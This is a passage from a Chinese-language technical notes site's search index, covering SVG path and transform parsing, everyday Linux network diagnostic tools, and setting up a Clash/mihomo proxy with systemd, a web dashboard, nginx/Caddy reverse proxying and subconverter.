number\n\n    def _get_flag(self, arg_array):\n        flag = arg_array[0]\n        if flag != 48 and flag != 49:\n            raise InvalidPathError(f\"Expected a flag (0/1), got '{chr(flag)}'\")\n        flag -= 48\n        self.args.append(flag)\n        arg_array[0:1] = b\"\"\n        self._strip_array(arg_array)\n        return flag\n</code></pre>"},{"location":"devops/frontend/svg/#transform","title":"transform \u7684\u5904\u7406","text":"<p>transform \u662f\u5bf9\u5f53\u524d\u5143\u7d20\u53ca\u5176\u5b50\u5143\u7d20\u7684\u6574\u4e2a\u5750\u6807\u7cfb\u8fdb\u884c\u7684\u53d8\u6362\uff0c\u4ece\u5de6\u5411\u53f3\u7ed3\u5408 \u6240\u4ee5\u4e5f\u5c31\u53ef\u4ee5\u770b\u505a\u5bf9\u5143\u7d20\u5e94\u7528 transform\uff0c\u4f46\u662f\u4ece\u53f3\u5411\u5de6\u7ed3\u5408</p> <p>\u6240\u6709\u7684 transform \u90fd\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a 3 \u9636\u77e9\u9635\uff1a</p> \\[\\begin{bmatrix} a &amp; c &amp; e \\\\ b &amp; d &amp; f \\\\ 0 &amp; 0 &amp; 1 \\end{bmatrix}\\] <p>\u4f5c\u7528\u65b9\u5f0f\u662f\uff1a</p> \\[ \\begin{bmatrix} x_\\text{prevCoordSys} \\\\ y_\\text{prevCoordSys} \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} a &amp; c &amp; e \\\\ b &amp; d &amp; f \\\\ 0 &amp; 0 &amp; 1 \\end{bmatrix}\\cdot \\begin{bmatrix} x_\\text{newCoordSys} \\\\ y_\\text{newCoordSys} \\\\ 1 \\end{bmatrix} \\] <p>\u5176\u4e2d \\((x_\\text{prevCoordSys}, y_\\text{prevCoordSys})\\) \u8868\u793a\u5728 transform \u524d\u7684\u5750\u6807\u7cfb\u7edf\u4e0b\u7684\u5750\u6807\uff0c\u8fd9\u4e2a 3 \u9636 transform \u7684\u77e9\u9635\u8bb0\u4e3a [a b c d e f]</p> <p>SVG \u4e00\u5171\u652f\u6301\u516d\u79cd transform\uff0c\u4e0b\u9762\u5177\u4f53\u6765\u8bf4\uff1a</p> <ul> <li>matrix(a b c d e f): \u65bd\u52a0\u77e9\u9635 [a b c d e f] \u4f5c\u7528</li> <li>translate(tx [ty]): \u5e73\u79fb\uff0cx \u8f74\u79fb tx\uff0cy \u8f74\u79fb ty\uff0c\u5982\u679c\u6ca1\u6709 ty \u5c31\u662f 0\u3002\u76f8\u5f53\u4e8e\u77e9\u9635 [1 0 0 1 tx ty]</li> <li>scale(sx [sy]): \u7f29\u653e\uff0cx \u8f74\u7f29\u653e sx \u500d\uff0cy \u8f74\u7f29\u653e sy \u500d\uff0c\u5982\u679c\u6ca1\u6709 sy\uff0c\u5219 sy \u548c sx \u76f8\u7b49\u3002\u76f8\u5f53\u4e8e\u77e9\u9635 [sx 0 0 sy 0 0]</li> <li>rotate(angle [cx cy]): \u987a\u65f6\u9488\u65cb\u8f6c angle \u5ea6\uff0c\u4ee5 cx cy \u4e3a\u4e2d\u5fc3\uff0c\u6ca1\u6709\u6307\u5b9a\u5c31\u662f\u539f\u70b9<ul> <li>rotate(angle cx cy) \u76f8\u5f53\u4e8e translate(cx cy) rotate(angle) translate(-cx -cy)</li> <li>rotate(a) \u76f8\u5f53\u4e8e\u77e9\u9635 [cos(a) sin(a) -sin(a) cos(a) 0 0]</li> </ul> </li> <li>skewX(angle): x \u8f74\u503e\u659c angle \u5ea6\uff0c\u76f8\u5f53\u4e8e\u77e9\u9635 [1 0 tan(a) 1 0 0]</li> <li>skewY(angle): y \u8f74\u503e\u659c angle \u5ea6\uff0c\u76f8\u5f53\u4e8e\u77e9\u9635 [1 tan(a) 0 1 0 0]</li> </ul>"},{"location":"devops/frontend/svg/#ebnf_2","title":"EBNF \u8bed\u6cd5","text":"transform \u7684 EBNF \u8bed\u6cd5 <pre><code>transform-list:\n    wsp* transforms? wsp*\ntransforms:\n    transform\n    | transform comma-wsp+ transforms\ntransform:\n    matrix\n    | translate\n    | scale\n    | rotate\n    | skewX\n    | skewY\nmatrix:\n    \"matrix\" wsp* \"(\" wsp*\n       number comma-wsp\n       number comma-wsp\n       number comma-wsp\n       number comma-wsp\n       number comma-wsp\n       number wsp* \")\"\ntranslate:\n    \"translate\" wsp* \"(\" wsp* number ( comma-wsp number )? wsp* \")\"\nscale:\n    \"scale\" wsp* \"(\" wsp* number ( comma-wsp number )? wsp* \")\"\nrotate:\n    \"rotate\" wsp* \"(\" wsp* number ( comma-wsp number comma-wsp number )? wsp* \")\"\nskewX:\n    \"skewX\" wsp* \"(\" wsp* number wsp* \")\"\nskewY:\n    \"skewY\" wsp* \"(\" wsp* number wsp* \")\"\n</code></pre> <p>\u6b63\u5219\u5339\u914d\u5206\u79bb transform: <pre><code>transform_pattern = re.compile(\"|\".join([x + r\"[^)]*\\)\" for x in transform_names]))\n</code></pre> \u91cc\u9762\u7684 number \u90fd\u53ef\u4ee5\u7528\u5f00\u5934\u8bf4\u5230\u7684\u6b63\u5219\u6765\u5339\u914d</p>"},{"location":"devops/frontend/svg/#_5","title":"\u6837\u5f0f","text":"<p>\u9ed8\u8ba4\u6837\u5f0f\uff1a <pre><code>DEFAULT_STYLE = {\n    \"fill\": \"black\",\n    \"stroke\": \"none\",\n    \"fill-opacity\": \"1\",\n    \"stroke-opacity\": \"1\",\n    \"stroke-width\": 0,\n}\n</code></pre> \u5269\u4e0b\u7684\u5c31\u662f\u6309\u7167 css \u7684\u89c4\u5219\u5c42\u53e0\u5c31\u597d\u4e86</p>"},{"location":"devops/network/","title":"\u7f51\u7edc\u8fd0\u7ef4","text":"<p>Abstract</p> <p>\u4e00\u4e9b\u7f51\u7edc\u8fd0\u7ef4\u7684\u57fa\u672c\u914d\u7f6e\u4e0e\u5de5\u5177\uff0c\u4e3b\u8981\u662f\u4e00\u4e9b\u914d\u7f6e\u65b9\u6cd5\u7684\u5907\u5fd8</p>"},{"location":"devops/network/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u57fa\u672c\u914d\u7f6e\u4e0e\u5de5\u5177</li> <li>Clash \u4ee3\u7406\u914d\u7f6e</li> <li>\u5185\u7f51\u7a7f\u900f\u4e0e\u53cd\u5411\u4ee3\u7406</li> <li>Web \u670d\u52a1\u5668\u76f8\u5173</li> </ul>"},{"location":"devops/network/basic/","title":"\u57fa\u672c\u914d\u7f6e\u4e0e\u5de5\u5177","text":"<p> \u7ea6 673 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u4e00\u4e9b\u7f51\u7edc\u914d\u7f6e\u57fa\u672c\u5de5\u5177\u7684\u4f7f\u7528\u8bb0\u5f55\u3002</p>"},{"location":"devops/network/basic/#_2","title":"\u914d\u7f6e\u5de5\u5177","text":""},{"location":"devops/network/basic/#networkmanager","title":"NetworkManager","text":"<p>debian \u4e0a <code>sudo apt install network-manager</code> \u5373\u53ef\u5b89\u88c5 nmcli \u548c nmtui\uff0c\u901a\u8fc7 systemd \u670d\u52a1 NetworkManager \u542f\u52a8\u3002</p> <ul> <li><code>nmcli device show</code>\uff1a\u663e\u793a\u8bbe\u5907\u4fe1\u606f\uff0c\u53ef\u4ee5\u663e\u793a\u662f\u5426\u6258\u7ba1\u3001\u8fde\u63a5\u72b6\u6001\u7b49</li> <li><code>nmtui</code>\uff1a\u901a\u8fc7 TUI \u6765\u914d\u7f6e\u5177\u4f53\u7684\u7f51\u7edc\u63a5\u53e3\u8fde\u63a5<ul> <li>Edit \u518d Activate \u5373\u53ef\u4fee\u6539\u8fde\u63a5\u914d\u7f6e</li> </ul> </li> </ul>"},{"location":"devops/network/basic/#firewalld","title":"firewalld","text":"<p><code>sudo apt install firewalld</code> \u5b89\u88c5\uff0c\u901a\u8fc7 systemd \u670d\u52a1 firewalld \u542f\u52a8\u3002\u53ef\u4ee5\u901a\u8fc7 cockpit \u76f4\u63a5\u7ba1\u7406\uff0c\u8fd8\u6ca1\u7528\u8fc7 firewall-cmd\uff0c\u4ee5\u540e\u518d\u8865\u5145\u3002</p> <p>\u4f46\u5728\u5f00\u542f firewall \u7684\u65f6\u5019\u5982\u679c\u662f\u8fdc\u7a0b\u8fde\u63a5\u8bb0\u5f97\u628a ssh \u7aef\u53e3\u6539\u56de 22\uff0c\u4e0d\u7136\u9ed8\u8ba4\u76f4\u63a5\u53ea\u5f00\u653e 22 \u4f1a\u5bfc\u81f4\u628a\u81ea\u5df1\u5899\u51fa\u53bb\u3002</p>"},{"location":"devops/network/basic/#ethtool","title":"ethtool","text":"<p><code>sudo apt install ethtool</code> \u5b89\u88c5\uff0c\u53ef\u4ee5\u67e5\u770b\u7f51\u5361\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6bd4\u5982\u901f\u7387\u3001\u53cc\u5de5\u6a21\u5f0f\u7b49\u3002</p> <ul> <li><code>ethtool &lt;interface&gt;</code>\uff1a\u67e5\u770b\u7f51\u5361\u57fa\u672c\u8bbe\u7f6e</li> <li><code>ethtool -s &lt;interface&gt; speed 1000 duplex full</code>\uff1a\u8bbe\u7f6e\u7f51\u5361\u901f\u7387\u548c\u53cc\u5de5\u6a21\u5f0f<ul> <li>\u4fee\u6539\u540e\u53ef\u4ee5\u901a\u8fc7 <code>ethtool &lt;interface&gt;</code> \u67e5\u770b\u662f\u5426\u751f\u6548</li> <li>\u4fee\u6539\u7684\u65f6\u5019\u5efa\u8bae\u5728\u673a\u5668\u4e0a\u76f4\u63a5\u64cd\u4f5c\uff0c\u4e0d\u8981\u8fdc\u7a0b\uff0c\u5426\u5219\u5bb9\u6613\u65ad\u6389\u8fde\u4e0d\u4e0a</li> </ul> </li> </ul> <p>\u5982\u679c\u4fee\u6539\u540e speed \u663e\u793a <code>Unkown!</code> \u53ef\u4ee5\u7b49\u4e00\u4f1a\u513f\uff08\u81f3\u5c11\u6211\u7b49\u4e00\u4f1a\u513f\u5c31\u597d\u4e86\uff09\uff0c\u4e00\u76f4\u4e0d\u884c\u7684\u8bdd\u53ef\u80fd\u5c31\u662f\u4e0d\u652f\u6301\uff0c\u9700\u8981\u518d\u6539\u56de\u53bb\u3002</p>"},{"location":"devops/network/basic/#_3","title":"\u8bca\u65ad\u5de5\u5177","text":""},{"location":"devops/network/basic/#_4","title":"\u8fde\u63a5\u8bca\u65ad","text":"<ul> <li><code>ping</code>\uff1a\u901a\u8fc7 ICMP \u6d4b\u8bd5\u8054\u901a\u6027\uff0c\u8bb0\u5f97\u5148\u5728\u7f51\u7edc\u6ca1\u95ee\u9898\u7684\u5730\u65b9 ping \u4e00\u4e0b\u770b\u770b\u76ee\u7684\u662f\u5426\u7981\u4e86 ping</li> <li><code>traceroute</code>\uff1a\u663e\u793a\u6570\u636e\u5305\u5230\u8fbe\u76ee\u7684\u5730\u7684\u8def\u5f84\uff08UDP\uff09</li> <li><code>iperf</code>\uff1a\u6d4b\u8bd5\u7f51\u7edc\u5e26\u5bbd\uff0c\u9700\u8981\u5728\u4e24\u53f0\u673a\u5668\u4e0a\u90fd\u5b89\u88c5 iperf\uff0c\u4e00\u53f0\u4f5c\u4e3a\u670d\u52a1\u7aef\uff0c\u4e00\u53f0\u4f5c\u4e3a\u5ba2\u6237\u7aef<ul> <li>\u670d\u52a1\u7aef\uff1a<code>iperf -s</code>\uff0c\u9ed8\u8ba4\u5f00\u5728 5001 \u7aef\u53e3</li> <li>\u5ba2\u6237\u7aef\uff1a<code>iperf -c &lt;server_ip&gt;</code></li> </ul> </li> </ul>"},{"location":"devops/network/basic/#_5","title":"\u7aef\u53e3\u76f8\u5173","text":"<ul> <li>\u67e5\u770b\u7aef\u53e3\u5360\u7528<ul> <li>lsof\uff1a<code>sudo apt install lsof</code> <code>lsof -i:&lt;port&gt;</code><ul> <li>\u53ea\u80fd\u770b\u5230\u5f53\u524d\u7528\u6237\u8fdb\u7a0b\u7684\uff0c\u975e\u5f53\u524d\u7528\u6237\u62e5\u6709\u7684\u5373\u4f7f\u5360\u7528\u4e86\u4e5f\u4e0d\u663e\u793a</li> <li>\u6240\u4ee5\u7528 sudo \u624d\u80fd\u6b63\u786e\u67e5\u8be2\u662f\u5426\u5360\u7528</li> </ul> </li> <li>netstat\uff1a<code>sudo apt install net-tools</code> <code>netstat -tunlp</code><ul> <li>-t TCP -u UDP -n \u7528\u6570\u5b57\u663e\u793a -l \u4ec5\u5217\u51fa\u76d1\u542c\u72b6\u6001 -p \u663e\u793a\u8fdb\u7a0b</li> <li>\u4e0d\u662f\u5f53\u524d\u7528\u6237\u62e5\u6709\u7684\u4e5f\u4f1a\u663e\u793a\u662f\u5426\u5360\u7528\uff0c\u4f46\u4e0d\u4f1a\u663e\u793a\u8fdb\u7a0b\u4fe1\u606f</li> <li>\u53ef\u4ee5 <code>| grep &lt;port&gt;</code> \u6765\u7b5b\u9009\u7aef\u53e3\uff0c\u6bcf\u5217\u5206\u522b\u4e3a\uff1a<ul> <li>\u534f\u8bae\u3001RecvQ\u3001SendQ\u3001\u672c\u5730\u5730\u5740\u3001\u8fdc\u7a0b\u5730\u5740\u3001\u72b6\u6001\u3001PID/\u8fdb\u7a0b\u540d</li> </ul> </li> </ul> </li> </ul> </li> <li>\u67e5\u770b\u7aef\u53e3\u662f\u5426\u5f00\u653e<ul> <li>nmap\uff1amacOS \u4e0a <code>brew install nmap</code> <code>nmap &lt;ip&gt; -p &lt;port&gt;</code>\uff1a\u626b\u63cf\u6307\u5b9a\u7aef\u53e3<ul> <li>Open\uff1anmap \u53d1\u51fa SYN\uff0c\u670d\u52a1\u5668\u4e0a\u76d1\u542c\u7684\u8fdb\u7a0b\u6062\u590d SYN/ACK\uff0cnmap \u76f4\u63a5 RST</li> <li>Closed\uff1anmap \u53d1\u51fa SYN\uff0c\u670d\u52a1\u5668\u4e0a\u76f4\u63a5 RST\uff08\u4e00\u822c\u662f\u56e0\u4e3a\u6ca1\u6709\u8fdb\u7a0b\u76d1\u542c\u7aef\u53e3\uff09</li> <li>Filtered\uff1a\u6ca1\u6536\u5230\u5e94\u7b54\uff0c\u53ef\u80fd\u662f\u88ab\u9632\u706b\u5899\u5c4f\u853d\u4e86\uff0c\u4e5f\u53ef\u80fd\u662f\u7aef\u53e3\u4e0a\u7684\u670d\u52a1\u6ca1\u6709\u54cd\u5e94</li> </ul> </li> </ul> </li> </ul>"},{"location":"devops/network/basic/#dns","title":"DNS","text":"<p><code>sudo apt install dnsutils</code></p> <ul> <li>dig\uff1a<code>dig &lt;domain&gt;</code></li> <li>nslookup\uff1a<code>nslookup &lt;domain&gt;</code></li> </ul>"},{"location":"devops/network/clash/","title":"Clash \u4ee3\u7406\u914d\u7f6e","text":"<p> \u7ea6 1591 \u4e2a\u5b57  136 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u91cc\u662f\u4e00\u4e9b clash \u76f8\u5173\u7684\u914d\u7f6e\uff0c\u5305\u62ec\u5b89\u88c5\u3001\u4f7f\u7528\u3001\u8ba2\u9605\u8fde\u63a5\u8f6c\u6362\u7b49\u3002</p> <p>\u6709\u53c2\u8003\uff1a</p> <ul> <li>\u65e0 GUI \u7684 Linux \u57fa\u4e8e clash \u4ee3\u7406\u4e0a\u7f51\u89e3\u51b3\u65b9\u6848</li> </ul>"},{"location":"devops/network/clash/#clash_1","title":"Clash \u5b89\u88c5\u4e0e\u914d\u7f6e","text":""},{"location":"devops/network/clash/#gui","title":"GUI","text":"<p>Clash \u76f8\u5173\u7684\u5f88\u591a repo \u5df2\u7ecf\u90fd\u5173\u6389\u4e86\uff0c\u4f46\u8fd8\u80fd\u67e5\u5230\u4e00\u4e9b ClashX\u3001ClashX Pro \u8fd9\u4e9b\u7ecf\u5178\u8f6f\u4ef6\u7684\u5b89\u88c5\u5305\u8fd8\u53ef\u4ee5\u7528\u3002</p> <p>\u4f46\u66f4\u63a8\u8350\u7528\u4e00\u4e9b\u201c\u6d3b\u7684\u201d\u5de5\u5177\uff0c\u6bd4\u5982  clash-verge-rev \u548c  mihomo-party\uff0c\u524d\u8005\u662f tauri\uff0c\u540e\u8005\u662f electron\uff0c\u90fd\u662f\u8de8\u5e73\u53f0\u7684\u3002</p> <p>GUI \u7684\u8f6f\u4ef6\u5b89\u88c5\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u5373\u88c5\u5373\u7528\u5c31\u597d\uff0c\u4f46 mihomo-party \u4f1a\u9ed8\u8ba4\u63a5\u7ba1 DNS \u914d\u7f6e\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5185\u7f51\u8fde\u4e0d\u4e0a\u4e4b\u7c7b\u7684\uff0c\u5728\u8bbe\u7f6e\u91cc\u9762\u76f4\u63a5\u5173\u6389\u63a5\u7ba1 DNS \u5c31\u597d\u4e86\u3002</p>"},{"location":"devops/network/clash/#gui_1","title":"\u65e0 GUI","text":"<p>\u4e00\u822c\u5728\u670d\u52a1\u5668\u4e0a\u914d\u7f6e clash \u5c31\u9700\u8981\u76f4\u63a5\u914d\u7f6e  MetaCubeX/mihomo \u4e5f\u5c31\u662f\u5957\u76ae\u7684 clash meta \u4e86\u3002</p>"},{"location":"devops/network/clash/#_1","title":"\u51c6\u5907\u5de5\u4f5c","text":"<p>\u4e0b\u8f7d\u4e4b\u524d\u53ef\u4ee5\u4e13\u95e8\u51c6\u5907\u4e00\u4e2a\u76ee\u5f55\u6bd4\u5982 <code>~/proxy</code> \u6765\u653e\u76f8\u5173\u7684\u6587\u4ef6\u3002</p> <p>\u5728 release \u9875\u9762\u4e0b\u8f7d\u6700\u65b0\u7684\u538b\u7f29\u5305\u518d\u89e3\u538b\u5c31\u597d\uff0c\u7248\u672c\u9009\u62e9\u666e\u901a\u6ca1\u5e26\u6807\u7b7e\u6216\u8005 compatible \u7684\u5e94\u8be5\u90fd\u53ef\u4ee5\uff0c\u4e0b\u8f7d\u7684\u4eba\u4e5f\u6700\u591a\uff1a</p> <pre><code>wget https://github.com/MetaCubeX/mihomo/releases/download/v1.18.10/mihomo-linux-amd64-compatible-v1.18.10.gz -O mihomo.gz\ngzip -d mihomo.gz\nmv mihomo clash\nchmod +x clash\n</code></pre> <p>\u8fd0\u884c\u8d77\u6765\u7684\u8bdd\u8fd8\u9700\u8981 cache.db \u548c geoip.metadb\uff0c\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u4e0b\u8f7d\uff0c\u4f46\u4f1a\u6bd4\u8f83\u6162\uff0c\u6709\u4e0b\u8f7d\u8fc7\u7684\u53ef\u4ee5\u76f4\u63a5 scp \u4e0a\u53bb\u3002</p> <p>\u4e4b\u540e\u8fd8\u9700\u8981\u4e00\u4e2a <code>config.yaml</code> \u914d\u7f6e\u6587\u4ef6\uff0c\u662f\u63d0\u4f9b\u4ee3\u7406\u670d\u52a1\u5668\u548c\u89c4\u5219\u7684\uff0c\u76f4\u63a5\u5c06 clash \u7684\u8ba2\u9605\u94fe\u63a5\u62c9\u4e0b\u6765\u5c31\u597d\uff1a</p> <pre><code>wget &lt;your subscription link&gt; -O config.yaml\n</code></pre> <p>\u51c6\u5907\u597d\u540e\u53ef\u80fd\u8fd8\u8981\u4fee\u6539\u4e00\u4e0b\u5934\u90e8\u7684 dns \u914d\u7f6e\uff0c\u4e0d\u7136\u5f00\u4e86 TUN \u4e4b\u540e\u53ef\u80fd\u4f1a\u8fde\u4e0d\u4e0a\u5185\u7f51\uff1a</p> <pre><code>dns:\n    enable: true\n    enhanced-mode: redir-host\n    nameserver:\n        - 10.10.0.21\n        - 10.10.2.21\n    fallback:\n        - 114.114.114.114\n        - 8.8.8.8\n    ipv6: false\n</code></pre>"},{"location":"devops/network/clash/#systemd","title":"systemd \u914d\u7f6e","text":"<p>\u63a5\u7740\u6211\u4eec\u9700\u8981\u8d77\u4e00\u4e2a systemd \u670d\u52a1\u6765\u8fd0\u884c clash\uff0c\u521b\u5efa\u6587\u4ef6 <code>/etc/systemd/system/clash.service</code> \u5e76\u5199\u5165\uff1a</p> <pre><code>[Unit]\nDescription=Clash-Meta Daemon.\nAfter=network.target NetworkManager.service systemd-networkd.service iwd.service\n\n[Service]\nType=simple\nLimitNPROC=500\nLimitNOFILE=1000000\nCapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH\nAmbientCapabilities=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH\nRestart=always\nExecStartPre=/usr/bin/sleep 1s\nExecStart=/path/to/proxy/clash -d /path/to/proxy\nExecReload=/bin/kill -HUP $MAINPID\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p><code>/path/to/proxy</code> \u6539\u6210\u6211\u4eec\u4e4b\u524d\u51c6\u5907\u7684\u90a3\u4e2a\u76ee\u5f55\uff0c\u5373\u5b58\u653e\u4e86 clash \u548c config.yaml \u7684\u76ee\u5f55\u3002\u7136\u540e\u542f\u52a8\u5c31\u597d\uff1a</p> <pre><code>sudo systemctl daemon-reload\nsudo systemctl start clash\nsudo systemctl status clash\n</code></pre> <p>\u4e4b\u540e\u7ec8\u7aef\u5c31\u53ef\u4ee5\u901a\u8fc7 <code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890</code> \u6765\u8bbe\u7f6e\u4ee3\u7406\u4e86\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e2a alias \u5230 proxy \u4e4b\u7c7b\u7684\u547d\u4ee4\u6765\u65b9\u4fbf\u4f7f\u7528\u3002\u8bbe\u7f6e\u5b8c\u53ef\u4ee5\u901a\u8fc7 <code>curl -v -I https://www.google.com/</code> \u6765\u6d4b\u8bd5\u4ee3\u7406\u662f\u5426\u751f\u6548\u3002</p> <p>\u53d6\u6d88\u4ee3\u7406\u7684\u8bdd\u76f4\u63a5 <code>unset https_proxy http_proxy all_proxy</code> \u5c31\u597d\u3002</p>"},{"location":"devops/network/clash/#ui-tun","title":"UI \u754c\u9762\u4e0e TUN \u6a21\u5f0f","text":"<p>mihomo \u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7f51\u9875 dashboard\uff0c\u53ef\u4ee5\u901a\u8fc7 config.yaml \u6765\u914d\u7f6e\u3002\u9996\u5148\u9700\u8981\u4e0b\u8f7d ui assets\uff1a</p> <pre><code>git clone https://github.com/metacubex/metacubexd.git -b gh-pages /path/to/proxy/ui\n</code></pre> <p>\u7136\u540e\u5728 config.yaml \u91cc\u9762\u52a0\u4e0a\uff1a</p> <pre><code>secret: &lt;your secret&gt;\nexternal-ui: /path/to/proxy/ui\nexternal-controller: 0.0.0.0:&lt;port&gt;\n</code></pre> <p>\u518d\u91cd\u542f systemd \u670d\u52a1\u4e4b\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 <code>http://&lt;ip&gt;:&lt;port&gt;/ui</code> \u6765\u8bbf\u95ee dashboard \u4e86\uff0c\u5176\u4e2d\u540e\u7aef\u586b <code>http://&lt;ip&gt;:&lt;port&gt;</code>\uff0c\u5bc6\u94a5\u5c31\u662f secret\u3002</p> <p>TUN \u6a21\u5f0f\u5728\u914d\u7f6e\u4e00\u9875\u91cc\u9762\u76f4\u63a5\u70b9\u51fb\u201c\u5f00\u542f TUN \u8f6c\u53d1\u201d\u5c31\u597d\u4e86\uff0c\u4e4b\u540e\u673a\u5668\u7684\u6240\u6709\u6d41\u91cf\u90fd\u4f1a\u8d70\u8fd9\u4e2a\u4ee3\u7406\u3002</p>"},{"location":"devops/network/clash/#_2","title":"\u53cd\u4ee3\u8bbf\u95ee","text":"<p>\u60f3\u8981\u901a\u8fc7\u57df\u540d\u6765\u76f4\u63a5\u8bbf\u95ee\u7684\u8bdd\u53ef\u4ee5\u901a\u8fc7 nginx \u6216 caddy \u6765\u914d\u7f6e\uff0c\u540c\u65f6\u6211\u4eec\u53ef\u4ee5\u5c06\u539f\u6765\u7684 <code>/ui/</code> \u63d0\u81f3 <code>/</code>\uff0c\u5c06 <code>/</code> \u518d\u79fb\u52a8\u5230 <code>/api/</code> \u53bb\uff0c\u8fd9\u6837\u8bbf\u95ee\u8d77\u6765\u4f1a\u66f4\u52a0\u65b9\u4fbf\u3002</p> nginx \u914d\u7f6e <p>\u76ee\u524d\u6211\u7684\u914d\u7f6e\uff0c\u53ef\u80fd\u4f1a\u6709\u70b9\u81c3\u80bf\uff0c\u4f46\u80fd\u7528 <pre><code>location ^~ /api/ {\n    proxy_pass http://127.0.0.1:&lt;port&gt;/;\n    proxy_set_header Host $host;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header REMOTE-HOST $remote_addr;\n    proxy_set_header Upgrade $http_upgrade;\n    proxy_set_header Connection \"upgrade\";\n    proxy_set_header X-Forwarded-Proto $scheme;\n    proxy_http_version 1.1;\n    add_header Cache-Control no-cache;\n}\n\nlocation ^~ / {\n    proxy_pass http://127.0.0.1:&lt;port&gt;/ui/;\n    proxy_set_header Host $host;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header REMOTE-HOST $remote_addr;\n    proxy_set_header Upgrade $http_upgrade;\n    proxy_set_header Connection \"upgrade\";\n    proxy_set_header X-Forwarded-Proto $scheme;\n    proxy_http_version 1.1;\n    add_header X-Cache $upstream_cache_status;\n}\n</code></pre></p> Caddy \u914d\u7f6e <p>Caddy \u5199\u8d77\u6765\u53ef\u80fd\u4f1a\u7565\u6709\u5201\u94bb\uff0c\u9700\u8981\u5224\u65ad\u4e00\u4e0b\u8def\u5f84\uff1a</p> <pre><code>@ui {\n    not path /api*\n}\n\nhandle_path /api* {\n    reverse_proxy localhost:&lt;port&gt;\n}\n\nhandle @ui {\n    rewrite * /ui{uri}\n    reverse_proxy localhost:&lt;port&gt;\n}\n</code></pre>"},{"location":"devops/network/clash/#_3","title":"\u8ba2\u9605\u8f6c\u6362","text":"<p>\u673a\u573a\u63d0\u4f9b\u7684\u8ba2\u9605\u94fe\u63a5\u5728\u4ee3\u7406\u7ec4\u65b9\u9762\u53ef\u80fd\u4e0d\u592a\u597d\u7528\uff0c\u6211\u4eec\u53ef\u4ee5\u53ea\u5229\u7528\u5176\u4e2d\u7684\u8282\u70b9\u4fe1\u606f\uff0c\u7136\u540e\u6839\u636e\u8282\u70b9\u540d\u79f0\u8fdb\u884c\u5206\u7c7b\uff0c\u91cd\u5efa\u4e00\u4e2a\u66f4\u65b9\u4fbf\u5206\u7c7b\u7ba1\u7406\u3001\u89c4\u5219\u5339\u914d\u7684\u8ba2\u9605\uff0c\u8fd9\u4e2a\u5c31\u662f subconverter \u5e72\u7684\u4e8b\u60c5\uff0c\u6574\u5957\u670d\u52a1\u90fd\u53ef\u4ee5\u81ea\u5efa\uff0c\u5206\u4e3a\u524d\u540e\u7aef\uff0c\u90e8\u7f72\u8d77\u6765\u4e5f\u4e0d\u590d\u6742\u3002</p>"},{"location":"devops/network/clash/#subconverter","title":"subconverter","text":"<p>\u540e\u7aef\u4f7f\u7528  tindy2013/subconverter\uff0c\u6211\u6709\u4e00\u4e2a\u4fee\u6539\u4e86\u7684\u7248\u672c  TonyCrane/subconverter\uff0c\u9609\u5272\u4e86\u4e00\u4e9b API \u7ba1\u7406\u7684\u65b9\u6cd5\uff0c\u5e76\u4e14\u4e3a\u6240\u6709 API \u7684\u8bbf\u95ee\u52a0\u4e0a\u4e86 token \u9a8c\u8bc1\uff0c\u81ea\u5df1\u90e8\u7f72\u7684\u8bdd\u4e5f\u53ef\u4ee5\u90e8\u7f72\u6211\u8fd9\u4e2a\u3002</p> <p>\u6211\u4eec\u9700\u8981 repo \u91cc\u9762\u7684 base \u76ee\u5f55\u4f5c\u4e3a\u5de5\u4f5c\u76ee\u5f55\uff0c\u4ee5\u4e0b\u4f1a\u8bb0\u4e3a <code>/path/to/base</code>\u3002\u9996\u5148\u9700\u8981\u5c06 subconverter \u7684\u4e8c\u8fdb\u5236\u4e0b\u8f7d\u5230\u5de5\u4f5c\u76ee\u5f55\u91cc\uff0c\u7136\u540e\u590d\u5236\u4e00\u4efd <code>pref.example.ini</code> \u5230 <code>pref.ini</code>\uff0c\u4fee\u6539\u4e00\u4e9b\u914d\u7f6e\uff1a</p> <pre><code>[common]\napi_mode=true\napi_access_token=...    # \u6211\u4fee\u6539\u7684\u90a3\u4e00\u4efd\u4f1a\u7528\u8fd9\u4e2a token \u5bf9\u6240\u6709 api \u8fdb\u884c\u9a8c\u8bc1\nexclude_remarks=(\u5230\u671f|\u5269\u4f59\u6d41\u91cf|\u65f6\u95f4|\u5b98\u7f51|\u4ea7\u54c1|\u5e73\u53f0|\u901a\u77e5)    # \u5982\u679c\u4f60\u7684\u8ba2\u9605\u91cc\u9762\u6709\u5176\u4ed6\u7684\u5173\u952e\u8bcd\u4e5f\u53ef\u4ee5\u52a0\u8fdb\u53bb\uff0c\u6211\u52a0\u4e86\u4e00\u4e2a\u201c\u901a\u77e5\u201d\n\n[managed_config]\nmanaged_config_prefix=https://xxx  # \u4f60\u7684\u670d\u52a1\u5730\u5740\n\n[server]\nlisten=127.0.0.1    # \u6700\u7ec8\u53cd\u4ee3\u51fa\u53bb\u7684\u8bdd\u76d1\u542c\u7aef\u53e3\u53ef\u4ee5\u6539\u6210\u672c\u5730\nport=xxx            # 